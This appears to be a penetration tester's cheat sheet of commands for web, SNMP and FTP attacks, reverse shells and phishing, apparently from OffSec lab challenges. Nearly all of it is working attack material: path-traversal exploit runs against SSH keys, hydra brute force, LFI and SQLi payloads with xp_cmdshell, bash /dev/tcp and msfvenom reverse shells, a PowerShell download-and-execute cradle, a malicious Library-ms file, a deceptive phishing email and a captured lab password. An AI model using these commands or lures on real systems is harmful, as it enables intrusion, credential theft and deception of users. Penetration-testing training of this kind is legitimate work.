

## Web

```bash

# Try Apache RCE exploit on all identified Apache web servers
./50383.sh info/targets.txt /etc/passwd
./50406.sh info/targets.txt /etc/passwd

# Get the private ssh key path traversal
./50383.sh 192.168.244.245.txt /home/anita/.ssh/id_rsa
./50383.sh 192.168.244.245.txt /home/anita/.ssh/id_ecdsa

# Dump a git repo
git-dumper http://192.168.214.144/.git/ .

# Try to grep for intresting strings
grep -r cred .
grep -r pass .
grep -r user .
grep -r secret .

# Check the git logs
git log
	commit 621a2e79b3a4a08bba12effe6331ff4513bad91a
git show 621a2e79b3a4a08bba12effe6331ff4513bad91a

# Bruteforce with hydra
hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.50.201 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"

# http-get login
hydra -l admin -P /usr/share/wordlists/rockyou.txt -s 80 192.168.230.201 http-get /

# Look for LFI
/backend/?view=/../../../../../etc/passwd

# Look for SQLi
# Insert ' to all in parameters
# Example of making a reverse shell through SQLi
' UNION SELECT 1,2,3,4; EXEC xp_cmdshell 'powershell -e JABjAG...' -- -


```

## SNMP

```bash

# Bruteforce the community string
python3 snmpbrute.py -t 192.168.x.x -f /usr/share/wordlists/seclists/Discovery/SNMP/snmp.txt

# Use snmpbulkwalk (faster) (Use . to not miss info)
snmpbulkwalk -Cr1000 -c public -v2c 192.168.158.150 . > info/snmpwalk.v2c

# Use snmpwalk (for v1) (Not sure if you can use . here)
snmpwalk -v1 -c public 192.168.158.150 > info/snmpwalk.150.v1

# Grep for intresting strings
cat info/snmpwalk.149.v2c | grep -i string
cat info/snmpwalk.149.v2c | grep -i pass
cat info/snmpwalk.149.v2c | grep -i user
cat info/snmpwalk.149.v2c | grep -i secret 

```

## FTP

```bash

# Check common logins
ftp 192.168.x.x
	anonymous:anonymous
	anonymous:
	ftp:ftp
	user:password
	admin:admin/password
	administrator:administrator/password

# Download all FTP files
wget -m ftp://anonymous:anonymous@192.168.x.x

```


## Reverse shell

```

# Try multiple payloads: https://www.revshells.com/

# Example of bash reverse shell
bash -c "/bin/bash -i >& /dev/tcp/192.168.45.152/1234 0>&1"

# Different examples of msfvenom reverse shells
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.222 LPORT=5555 -f exe -o revshell.exe

msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.222 LPORT=4455 -f dll -o revshell.dll

msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.45.216 LPORT=6666 -f sh -o revshell.sh

msfvenom -p php/reverse_php LHOST=192.168.45.222 LPORT=7777 -f raw -o revshell.php

msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.216 LPORT=443 -f aspx -o reverse.aspx


```

## Phishing attack

```bash

# Lets set up a webdav server
wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/Projects/Offsec/Challenges/Relia/webdav

# Create a file called config.Library-ms on Windows and transfer to Kali
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://INSERT_IP</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
 
# Create a shortcut on windows and transfer to Kali
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://172.16.144.101:1235/powercat.ps1'); powercat -c 172.16.144.101 -p 1234 -e powershell"
 
# Start a webserver to serve powercat
cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .
python3 -m http.server 8000
 
# Start a nc in a new window
nc -nvlp 4444
 
# Create a phising email and send it via the tool swaks
# Creata a file body.txt
-----
Hey!
I checked WEBSRV1 and discovered that the previously used staging script still exists in the Git logs. Ill remove it for security reasons.
 
On an unrelated note, please install the new security features on your workstation. For this, download the attached file, double-click on it, and execute the configuration shortcut within. Thanks!
 
John
-----
 
# Send the email as the maildmz user we previously pwned to jim
sudo swaks -t jim@relia.com --from maildmz@relia.com  --attach @config.Library-ms --server 192.168.171.189 --body @body.txt --header "Subject: Staging Script" --suppress-data -ap
username: maildmz
password: DPuBT9tGCBrTbR

```